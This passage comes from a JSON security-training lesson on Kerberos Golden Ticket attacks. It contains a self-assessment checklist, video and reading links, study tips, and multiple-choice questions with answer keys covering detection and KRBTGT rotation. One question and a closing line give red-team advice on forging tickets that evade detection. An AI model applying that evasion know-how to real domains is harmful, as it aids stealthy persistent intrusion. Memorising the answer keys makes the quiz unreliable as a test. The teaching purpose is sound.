Attack**: How Golden Ticket's prerequisite works\n- **Silver Ticket**: Service-specific alternative to Golden Ticket\n- **Pass-the-Hash**: Using NTLM hashes for authentication\n- **Pass-the-Ticket**: Using legitimate Kerberos tickets (not forged)\n- **Skeleton Key**: Another persistence technique\n- **DCShadow**: Rogue domain controller for persistence\n\n## Self-Assessment Checklist\n\nRate yourself (1-5) on these competencies:\n\n**Conceptual Understanding:**\n☐ I can explain what KRBTGT is and why it's critical (1-5)\n☐ I understand how Kerberos authentication works (1-5)\n☐ I can describe how Golden Tickets are forged (1-5)\n☐ I know why KRBTGT rotation invalidates Golden Tickets (1-5)\n\n**Technical Skills:**\n☐ I can use Mimikatz to DCSync KRBTGT (1-5)\n☐ I can forge a Golden Ticket with Mimikatz (1-5)\n☐ I can forge a Golden Ticket with Impacket (1-5)\n☐ I can detect Golden Tickets in Event logs (1-5)\n\n**Operational Knowledge:**\n☐ I know how to rotate KRBTGT properly (two rotations) (1-5)\n☐ I can build SIEM detection rules for Golden Tickets (1-5)\n☐ I understand OPSEC considerations for using Golden Tickets (1-5)\n☐ I can respond to a Golden Ticket incident (1-5)\n\n**Score yourself:**\n- **48-60**: Expert level, ready for real-world application\n- **36-47**: Strong foundation, practice technical skills more\n- **24-35**: Good conceptual understanding, need hands-on labs\n- **12-23**: Review lesson sections, focus on key concepts\n- **0-11**: Re-read lesson, draw diagrams, use memory aids\n\n## Final Thought\n\nGolden Tickets represent the **ultimate domain compromise**. They survive password resets, account deletions, and most incident response procedures. The only reliable remediation is KRBTGT rotation—a process that 95% of organizations have never performed.\n\n**For attackers**: Golden Tickets are your insurance policy. Extract KRBTGT early, use sparingly, maintain OPSEC.\n\n**For defenders**: If you remember ONE thing from this lesson, let it be this:\n\n**\"If you suspect domain compromise, rotate KRBTGT twice. No exceptions.\"**\n\nMaster this technique, and you'll be prepared for one of the most challenging scenarios in Active Directory security."
    },
    {
      "type": "video",
      "title": "Video Tutorial: Golden Ticket Attack Demonstration",
      "content": "Watch this comprehensive video tutorial demonstrating Golden Ticket attacks in a live Active Directory environment. This video covers DCSync to extract KRBTGT, forging Golden Tickets with Mimikatz, using tickets for domain access, and defensive strategies including KRBTGT rotation.\n\n**Video**: [Golden Ticket Attack Explained by John Hammond](https://www.youtube.com/watch?v=pZSyGRjHNO4)\n\n**What you'll see:**\n- DCSync demonstration to extract KRBTGT hash from Domain Controller\n- Mimikatz Golden Ticket forging with various parameters\n- Using forged tickets to access domain resources without authentication\n- Creating tickets for fake users (non-existent in AD)\n- Detection challenges and why Golden Tickets are hard to spot\n- KRBTGT password rotation procedure (the only effective remediation)\n\n**Duration**: ~25 minutes\n\n**Recommended viewing**: After completing the lesson to see the complete attack chain in action.\n\n**Alternative Resource**: [IppSec - Golden Ticket Walkthrough](https://www.youtube.com/watch?v=IzWN9MvBpcw) (~18 min)\n\n**Additional Resources:**\n- [ired.team: Golden Ticket](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)\n- [HackTricks: Golden Ticket Attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)\n- [Microsoft: New-KrbtgtKeys.ps1 Script](https://github.com/microsoft/New-KrbtgtKeys.ps1) (official KRBTGT rotation tool)\n- [ANSSI: KRBTGT Rotation Technical Guide](https://www.cert.ssi.gouv.fr/)"
    }
  ],
  "post_assessment": [
    {
      "question": "You've detected a Golden Ticket attack and immediately rotated the KRBTGT password once. Twelve hours later, the attacker still has access to domain resources. What is the MOST LIKELY reason?",
      "options": [
        "The attacker has backdoor Domain Admin accounts that you haven't discovered yet",
        "KRBTGT has two active password hashes (current and previous); you need to rotate a second time to invalidate the old hash",
        "The attacker extracted the new KRBTGT hash again after your first rotation",
        "Your KRBTGT rotation script failed due to replication errors across domain controllers"
      ],
      "correct_option": 1,
      "explanation": "KRBTGT maintains TWO password hashes at any time: the current password and the previous password. This is for backward compatibility during password changes. When you rotate KRBTGT the first time, the old hash becomes the 'previous' hash and remains valid. Golden Tickets created with the old hash still work! You must wait for all legitimate TGTs to expire (default 10 hours), then rotate KRBTGT a SECOND time to invalidate the old hash completely. This is why Microsoft's guidance explicitly requires two rotations with a 10+ hour wait between them."
    },
    {
      "question": "You're analyzing Windows Event logs and find Event ID 4769 (Kerberos service ticket request) for user 'admin_backup' requesting access to a file share. However, there's no corresponding Event ID 4768 (Kerberos TGT request) for 'admin_backup' in the preceding 24 hours. Additionally, querying Active Directory shows no user account named 'admin_backup'. What is the MOST APPROPRIATE conclusion?",
      "options": [
        "This is normal behavior; Event 4768 is only logged on the client workstation, not the domain controller",
        "The logs were tampered with by the attacker to remove Event 4768 entries",
        "This is strong evidence of a Golden Ticket attack: the TGT was forged offline (no Event 4768), and the user doesn't exist in AD",
        "This is a misconfiguration; the account 'admin_backup' exists but isn't syncing properly with the domain controller"
      ],
      "correct_option": 2,
      "explanation": "This is a textbook Golden Ticket indicator. Normal Kerberos flow: (1) client requests TGT from DC (Event 4768), (2) client uses TGT to request service ticket from DC (Event 4769). With a Golden Ticket, the TGT is forged offline, so Event 4768 never occurs—the first DC interaction is Event 4769 when requesting a service ticket. The fact that 'admin_backup' doesn't exist in AD is the smoking gun: Golden Tickets can impersonate non-existent users because the TGT contains all identity information (username, groups) and the DC trusts it without checking AD. This is one of the most reliable Golden Ticket detection methods: Event 4769 without prior Event 4768 + non-existent user = confirmed Golden Ticket."
    },
    {
      "question": "As a red teamer, you've successfully extracted the KRBTGT hash and want to maintain persistent access while minimizing detection risk. Which combination of Golden Ticket parameters provides the BEST operational security (OPSEC)?",
      "options": [
        "User: Administrator, Lifetime: 10 years, Encryption: RC4, Groups: Domain Admins + Enterprise Admins, Access pattern: Immediate credential dumping from all DCs",
        "User: FakeAdmin (non-existent), Lifetime: 10 hours, Encryption: AES256, Groups: Domain Admins, Access pattern: Gradual access to specific resources during business hours",
        "User: bob (real low-privilege user), Lifetime: 10 hours, Encryption: AES256, Groups: 512 (Domain Admins) + 513 (Domain Users), Access pattern: Access only resources bob normally uses, during business hours, from bob's workstation",
        "User: krbtgt, Lifetime: 30 days, Encryption: AES256, Groups: Domain Admins, Access pattern: Only access domain controllers during scheduled maintenance windows"
      ],
      "correct_option": 2,
      "explanation": "Option C provides the best OPSEC by maximizing stealth: (1) Using a real user ('bob') avoids the non-existent user detection method, (2) 10-hour lifetime matches normal TGT policy (not suspicious), (3) AES256 encryption is modern and expected, (4) Injecting Domain Admin into bob's normal groups creates privileged access while appearing as a legitimate user, (5) Accessing only bob's normal resources avoids anomaly detection, (6) Business hours and normal workstation location blend with legitimate activity. Option A is terrible OPSEC (screams 'attack'). Option B's fake user is easily detected via AD correlation. Option D impersonating 'krbtgt' is technically invalid and would fail. Good OPSEC = blend in, bad OPSEC = stand out."
    },
    {
      "question": "Your organization's KRBTGT password was last changed when the domain was created in 2015 (9 years ago). During a recent breach investigation, you found evidence that attackers had Domain Admin access for 2 weeks in 2022 before being detected and evicted. All user passwords were reset and systems were rebuilt. It's now 2024 and you've found suspicious activity suggesting the attackers have returned. What should you conclude about Golden Ticket risk?",
      "options": [
        "No Golden Ticket risk; the 2022 password resets and system rebuilds would have invalidated any Golden Tickets",
        "Low Golden Ticket risk; even if they extracted KRBTGT in 2022, Golden Tickets expire after 1 year maximum",
        "High Golden Ticket risk; if they extracted KRBTGT in 2022 and you've never rotated it (it's still the 2015 password), their Golden Tickets are still valid",
        "Medium Golden Ticket risk; they would need to compromise the domain again to extract the current KRBTGT hash"
      ],
      "correct_option": 2,
      "explanation": "This is HIGH risk. If attackers had Domain Admin access in 2022, they almost certainly performed DCSync to extract the KRBTGT hash. Since KRBTGT was set in 2015 and has NEVER been rotated (not in 2022, not in 2024), that same 2015 KRBTGT hash is still valid today. Any Golden Tickets forged with that hash in 2022 still work in 2024—this is the entire point of Golden Tickets as a persistence mechanism. Password resets (option A) don't affect Golden Tickets. Golden Tickets don't expire based on calendar time (option B); they work until KRBTGT is rotated. Option D is wrong because they don't need to re-compromise—they already have the key. This scenario (KRBTGT never rotated + previous Domain Admin compromise) should trigger immediate KRBTGT rotation twice."
    }
  ],
  "jim_kwik_principles": [
    "Chunking: Golden Tickets are complex—break into chunks: KRBTGT basics, extraction methods, forging, usage, detection, remediation. Master each chunk before moving to the next.",
    "Active Recall: Close this lesson and draw the Golden Ticket attack flow from memory. Explain it out loud. Test yourself on Event IDs, Mimikatz commands, and rotation procedures.",
    "Spaced Repetition: Review this lesson after 1 day, 3 days, 1 week, and 1 month. Each review strengthens long-term memory.",
    "Teaching to Learn: Explain Golden Tickets to a colleague, write a blog post, or create a presentation. Teaching forces you to organize knowledge and identify gaps.",
    "Connection: Link Golden Tickets to what you already know: Kerberoasting (previous lesson), Pass-the-Hash, lateral movement. Build a mental map of AD attack techniques."
  ]
}